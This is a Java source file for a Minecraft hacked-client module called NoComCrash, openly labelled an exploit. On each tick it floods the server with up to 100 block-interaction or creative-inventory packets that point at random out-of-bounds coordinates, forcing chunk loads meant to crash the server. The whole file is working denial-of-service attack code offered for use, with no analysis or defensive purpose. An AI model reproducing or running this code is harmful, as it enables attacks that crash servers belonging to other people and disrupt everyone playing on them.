/*
 * This file is part of the atomic client distribution.
 * Copyright (c) 2021-2021 0x150.
 */

package me.x150.sipprivate.feature.module.impl;

import me.x150.sipprivate.SipoverPrivate;
import me.x150.sipprivate.feature.config.DoubleSetting;
import me.x150.sipprivate.feature.config.EnumSetting;
import me.x150.sipprivate.feature.module.Module;
import me.x150.sipprivate.feature.module.ModuleType;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

import java.util.Objects;
import java.util.Random;

public class NoComCrash extends Module {
    final Random r = new Random();
    DoubleSetting       packets = this.config.create(new DoubleSetting.Builder(5).precision(0).name("Packets per tick").description("How many crash packets to send per tick").min(1).max(100).get());
    EnumSetting<Method> method  = this.config.create(new EnumSetting.Builder<>(Method.Interact).name("Method")
            .description("Chunk loading method. Interact works on vanilla/spigot, BLT on creative mode").get());
    int                 i       = 0;

    public NoComCrash() {
        super("NoComCrash", "Crashes the server by requesting chunks out of bounds", ModuleType.EXPLOIT);
    }

    @Override public void tick() {
        for (int i = 0; i < packets.getValue(); i++) {
            Vec3d cpos = pickRandomPos();
            if (method.getValue() == Method.Interact) {
                PlayerInteractBlockC2SPacket packet = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(cpos, Direction.DOWN, new BlockPos(cpos), false));
                Objects.requireNonNull(SipoverPrivate.client.getNetworkHandler()).sendPacket(packet);
            } else {
                ItemStack stack = new ItemStack(Items.OAK_SIGN, 1);
                NbtCompound nbt = stack.getOrCreateSubNbt("BlockEntityTag");
                nbt.putInt("x", (int) cpos.x);
                nbt.putInt("y", (int) cpos.y);
                nbt.putInt("z", (int) cpos.z);
                //                stack.setSubNbt("BlockEntityTag", nbt);
                CreativeInventoryActionC2SPacket packet = new CreativeInventoryActionC2SPacket(1, stack);
                Objects.requireNonNull(SipoverPrivate.client.getNetworkHandler()).sendPacket(packet);
            }
            this.i++;
        }
    }

    Vec3d pickRandomPos() {
        int x = r.nextInt(16777215);
        int y = 255;
        int z = r.nextInt(16777215);
        return new Vec3d(x, y, z);
    }

    @Override public void enable() {

    }

    @Override public void disable() {
        i = 0;
    }

    @Override public String getContext() {
        return i == 0 ? "Waiting" : i + " " + (i == 1 ? "packet" : "packets") + " sent";
    }

    @Override public void onWorldRender(MatrixStack matrices) {

    }

    @Override public void onHudRender() {

    }

    public enum Method {
        Interact, BLT
    }
}

